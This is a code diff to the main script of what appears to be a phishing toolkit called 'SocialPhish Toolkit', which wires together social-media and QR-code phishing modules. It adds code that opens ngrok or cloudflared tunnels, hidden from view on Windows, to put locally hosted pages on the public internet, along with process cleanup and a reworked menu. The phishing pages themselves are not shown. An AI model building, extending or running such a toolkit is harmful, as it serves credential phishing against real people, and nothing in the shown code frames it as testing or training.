@@ -3,6 +3,12 @@
 import os
 import sys
 import argparse
+import platform
+import subprocess
+import signal
+import json
+import time
+import psutil
 from rich.console import Console
 from rich.table import Table
 from rich.panel import Panel
@@ -11,11 +17,54 @@ import pyfiglet
 from rich import box
 from modules.qr_phisher import QRPhisher
 from modules.social_phisher import SocialPhisher
-import json
 from rich.prompt import Prompt
 from rich.text import Text
 
 console = Console()
+
+# Global variables for process management
+ngrok_process = None
+cloudflared_process = None
+
+def is_process_running(process):
+    """Check if a process is running."""
+    if process is None:
+        return False
+    try:
+        return process.poll() is None
+    except:
+        return False
+
+def kill_process(process):
+    """Safely kill a process and its children."""
+    if process is None:
+        return
+    
+    try:
+        parent = psutil.Process(process.pid)
+        for child in parent.children(recursive=True):
+            try:
+                child.kill()
+            except psutil.NoSuchProcess:
+                pass
+        parent.kill()
+    except (psutil.NoSuchProcess, ProcessLookupError):
+        pass
+
+def cleanup_processes():
+    """Cleanup all running processes."""
+    global ngrok_process, cloudflared_process
+    kill_process(ngrok_process)
+    kill_process(cloudflared_process)
+
+def signal_handler(signum, frame):
+    """Handle cleanup on program exit."""
+    cleanup_processes()
+    sys.exit(0)
+
+# Register signal handlers
+signal.signal(signal.SIGINT, signal_handler)
+signal.signal(signal.SIGTERM, signal_handler)
 
 def print_banner():
     """Create a stylish banner with enhanced visual effects."""
@@ -254,41 +303,111 @@ def manage_settings():
             console.print("[green]Settings saved successfully[/green]")
             break
 
+def start_tunnel_service(service_type, port):
+    """Start and manage tunnel services (ngrok/cloudflared)."""
+    global ngrok_process, cloudflared_process
+    
+    if service_type == "ngrok":
+        # Check if ngrok is already running
+        if is_process_running(ngrok_process):
+            console.print("[yellow]Ngrok is already running[/yellow]")
+            return True
+            
+        # Kill any existing ngrok processes
+        cleanup_processes()
+        
+        try:
+            if platform.system() == "Windows":
+                ngrok_process = subprocess.Popen(
+                    ["ngrok", "http", str(port)],
+                    stdout=subprocess.PIPE,
+                    stderr=subprocess.PIPE,
+                    creationflags=subprocess.CREATE_NO_WINDOW
+                )
+            else:
+                ngrok_process = subprocess.Popen(
+                    ["ngrok", "http", str(port)],
+                    stdout=subprocess.PIPE,
+                    stderr=subprocess.PIPE
+                )
+            time.sleep(3)  # Wait for ngrok to start
+            return True
+        except Exception as e:
+            console.print(f"[red]Error starting ngrok: {str(e)}[/red]")
+            return False
+            
+    elif service_type == "cloudflared":
+        # Check if cloudflared is already running
+        if is_process_running(cloudflared_process):
+            console.print("[yellow]Cloudflared is already running[/yellow]")
+            return True
+            
+        # Kill any existing cloudflared processes
+        cleanup_processes()
+        
+        try:
+            if platform.system() == "Windows":
+                cloudflared_process = subprocess.Popen(
+                    ["cloudflared", "tunnel", "--url", f"http://localhost:{port}"],
+                    stdout=subprocess.PIPE,
+                    stderr=subprocess.PIPE,
+                    creationflags=subprocess.CREATE_NO_WINDOW
+                )
+            else:
+                cloudflared_process = subprocess.Popen(
+                    ["cloudflared", "tunnel", "--url", f"http://localhost:{port}"],
+                    stdout=subprocess.PIPE,
+                    stderr=subprocess.PIPE
+                )
+            time.sleep(3)  # Wait for cloudflared to start
+            return True
+        except Exception as e:
+            console.print(f"[red]Error starting cloudflared: {str(e)}[/red]")
+            return False
+    
+    return False
+
 def main():
-    if not os.geteuid() == 0:
-        console.print("[red]This script must be run as root![/red]")
+    try:
+        args = setup_argparse()
+        print_banner()
+        
+        if args.module:
+            if args.module == 'qr':
+                qr_phisher = QRPhisher()
+                qr_phisher.run()
+            elif args.module == 'social':
+                social_phisher = SocialPhisher()
+                social_phisher.run()
+        else:
+            while True:
+                show_menu()
+                # Accept both formats: 1/01, 2/02, etc.
+                choice = Prompt.ask("Select an option", choices=["1", "01", "2", "02", "3", "03", "4", "04"])
+                
+                # Normalize the choice to remove leading zero
+                choice = str(int(choice))
+                
+                if choice == "1":
+                    social_phisher = SocialPhisher()
+                    social_phisher.run()
+                elif choice == "2":
+                    qr_phisher = QRPhisher()
+                    qr_phisher.run()
+                elif choice == "3":
+                    manage_settings()
+                elif choice == "4":
+                    cleanup_processes()
+                    console.print("[green]Thank you for using SocialPhish Toolkit![/green]")
+                    sys.exit(0)
+    except KeyboardInterrupt:
+        cleanup_processes()
+        console.print("\n[yellow]Exiting...[/yellow]")
+        sys.exit(0)
+    except Exception as e:
+        console.print(f"[red]An error occurred: {str(e)}[/red]")
+        cleanup_processes()
         sys.exit(1)
 
-    # Clear screen
-    os.system('clear')
-    
-    args = setup_argparse()
-    print_banner()
-
-    while True:
-        show_menu()
-        choice = Prompt.ask(
-            "\n[bright_green]┌──([bright_red]S-Phish[/bright_red]㉿[bright_red]Toolkit[/bright_red])-[[bright_blue]Menu[/bright_blue]]\n[bright_green]└─$[/bright_green]",
-            choices=["1", "2", "3", "4"]
-        )
-
-        if choice == "1":
-            social_phisher = SocialPhisher()
-            social_phisher.run()
-        elif choice == "2":
-            qr_phisher = QRPhisher()
-            qr_phisher.run()
-        elif choice == "3":
-            manage_settings()
-        elif choice == "4":
-            console.print("[yellow]Thank you for using S-Phish Toolkit![/yellow]")
-            sys.exit(0)
-        else:
-            console.print("[red]Invalid choice. Please try again.[/red]")
-
 if __name__ == "__main__":
-    try:
-        main()
-    except KeyboardInterrupt:
-        console.print("\n[red]Operation cancelled by user. Exiting...[/red]")
-        sys.exit(0) 
+    main() 
